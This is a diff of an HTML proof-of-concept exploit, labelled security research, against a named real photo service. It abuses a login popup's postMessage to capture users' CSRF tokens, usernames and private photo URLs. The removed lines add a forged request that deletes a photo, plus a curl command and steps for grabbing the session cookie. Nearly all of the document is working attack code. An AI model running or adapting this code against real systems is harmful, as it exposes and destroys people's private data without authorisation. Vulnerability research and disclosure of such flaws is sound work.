@@ -1,123 +1,88 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>PoC - Login to Delete</title></head>
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - Photo Access Test</title>
+</head>
 <body>
-    <h3>PoC - Security Research</h3>
-    Photo ID: <input type="text" id="photoId" value="11863114291"><br><br>
-    <button onclick="startFlow()">Start Attack Flow</button>
-    <pre id="log" style="background:#f4f4f4;padding:10px;max-height:500px;overflow:auto;font-size:12px;"></pre>
+    <h3>PoC - Access User Photos</h3>
+    
+    <button onclick="startFlow()">Start - Login & Get Photos</button>
+    
+    <div id="output" style="margin-top:20px;"></div>
 
 <script>
-const TARGET = {
-    login: 'https://photos3.walmart.com/users/oauth2/login',
-    builder: 'https://photos3.walmart.com/order/prints-builder',
-    delete: 'https://photos3.walmart.com/order/add_from_prints_builder'
-};
-
-let csrfToken = null;
-let sessionCookies = null;
-
-function log(msg) {
-    document.getElementById('log').textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-    console.log(msg);
-}
+const LOGIN_URL = 'https://photos3.walmart.com/users/oauth2/login';
 
 function startFlow() {
-    log('Step 1: Opening login popup...');
-    const popup = window.open(TARGET.login, 'loginPopup', 'width=700,height=800');
-    if (!popup) { log('ERROR: Popup blocked'); return; }
+    console.log('Opening login popup...');
     
-    window.addEventListener('message', function handleMsg(event) {
-        if (event.origin !== 'https://photos3.walmart.com' && event.origin !== 'https://www.walmart.com') return;
+    const popup = window.open(LOGIN_URL, 'loginPopup', 'width=700,height=800');
+    
+    if (!popup) {
+        alert('Popup blocked! Allow popups and try again.');
+        return;
+    }
+    
+    // Listen for message from popup
+    window.addEventListener('message', function(event) {
+        // Check message is from walmart
+        if (event.origin !== 'https://photos3.walmart.com' && 
+            event.origin !== 'https://www.walmart.com') {
+            return;
+        }
         
-        log(`Step 2: Message from ${event.origin}`);
+        console.log('Message received from:', event.origin);
+        console.log('Raw data:', event.data);
         
+        // Check if message contains login data
         if (typeof event.data === 'string' && event.data.includes('login:')) {
-            try {
-                const jsonStr = event.data.split('login:')[1];
-                const data = JSON.parse(jsonStr);
-                csrfToken = data.csrf;
-                log(`✓ Captured CSRF: ${csrfToken}`);
+            
+            // Extract JSON part
+            const jsonStr = event.data.split('login:')[1];
+            const data = JSON.parse(jsonStr);
+            
+            // Show captured data
+            const output = document.getElementById('output');
+            output.innerHTML = '<h4>✅ Captured Data:</h4>';
+            output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+            
+            // Get photo URL
+            const photoUrl = data.previous_basket_contents?.prints_thumbnail;
+            const printIds = data.previous_basket_contents?.print_ids;
+            
+            if (photoUrl) {
+                output.innerHTML += '<h4>📸 User Photo URL:</h4>';
+                output.innerHTML += '<p>' + photoUrl + '</p>';
+                output.innerHTML += '<a href="' + photoUrl + '" target="_blank">Open Photo in New Tab</a>';
                 
-                log('Step 3: Opening prints-builder...');
-                const builder = window.open(TARGET.builder, 'builderWin', 'width=1000,height=800');
-                
-                setTimeout(() => sendDelete(builder), 3000);
-                
-            } catch (e) { log(`Parse error: ${e.message}`); }
+                // Auto-open photo to prove access
+                setTimeout(() => {
+                    window.open(photoUrl, '_blank');
+                }, 1000);
+            }
+            
+            if (printIds && printIds.length > 0) {
+                output.innerHTML += '<h4>📋 Print IDs:</h4>';
+                output.innerHTML += '<p>' + printIds.join(', ') + '</p>';
+            }
+            
+            // Show CSRF token
+            if (data.csrf) {
+                output.innerHTML += '<h4>🔑 CSRF Token:</h4>';
+                output.innerHTML += '<p>' + data.csrf + '</p>';
+            }
+            
+            // Show username
+            if (data.logged_in_user_name) {
+                output.innerHTML += '<h4>👤 Logged in User:</h4>';
+                output.innerHTML += '<p>' + data.logged_in_user_name + '</p>';
+            }
         }
     });
-    log('Waiting for login...');
+    
+    console.log('Waiting for login completion...');
 }
-
-async function sendDelete(builderWin) {
-    const photoId = document.getElementById('photoId').value.trim();
-    if (!csrfToken || !photoId) { log('Missing token or ID'); return; }
-    
-    log(`Step 4: Attempting delete for photo ${photoId}...`);
-    
-    const payload = { sizes: [], to_be_deleted: [parseInt(photoId)] };
-    
-    // Try fetch first (will likely fail due to CORS)
-    try {
-        const response = await fetch(TARGET.delete, {
-            method: 'POST',
-            credentials: 'include',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-Csrf-Token': csrfToken,
-                'Origin': 'https://photos3.walmart.com',
-                'Referer': TARGET.builder
-            },
-            body: JSON.stringify(payload)
-        });
-        const text = await response.text();
-        log(`Response: ${response.status} - ${text}`);
-        if (response.ok) log('✅ SUCCESS via fetch');
-        return;
-    } catch (err) {
-        log(`⚠️ Fetch failed (CORS): ${err.message}`);
-    }
-    
-    // Fallback: Generate curl command for manual execution
-    log('\n--- 🛠️ MANUAL EXECUTION (CORS workaround) ---');
-    log('Copy and run this curl command in your terminal:');
-    log('');
-    
-    const curlCmd = `curl -X POST '${TARGET.delete}' \\
-  -H 'Content-Type: application/json' \\
-  -H 'X-Csrf-Token: ${csrfToken}' \\
-  -H 'Origin: https://photos3.walmart.com' \\
-  -H 'Referer: ${TARGET.builder}' \\
-  -H 'Cookie: _web-kiosk_session=YOUR_SESSION_COOKIE_HERE' \\
-  -d '${JSON.stringify(payload)}'`;
-    
-    log(curlCmd);
-    log('');
-    log('📋 To get your session cookie:');
-    log('1. Open https://photos3.walmart.com/order/prints-builder in a new tab');
-    log('2. Open DevTools → Application → Cookies → https://photos3.walmart.com');
-    log('3. Copy the value of _web-kiosk_session');
-    log('4. Replace YOUR_SESSION_COOKIE_HERE in the curl command above');
-    log('5. Run the command in terminal');
-    
-    // Bonus: Try to execute from builder window via postMessage
-    if (builderWin) {
-        log('\n🔄 Trying to execute from builder window (same-origin)...');
-        try {
-            builderWin.postMessage({
-                action: 'deletePhoto',
-                photoId: photoId,
-                csrf: csrfToken
-            }, 'https://photos3.walmart.com');
-            log('Sent command to builder window - check its console for results');
-        } catch (e) {
-            log(`Could not message builder: ${e.message}`);
-        }
-    }
-}
-
-log('PoC loaded. Click button to start.');
 </script>
 </body>
 </html>
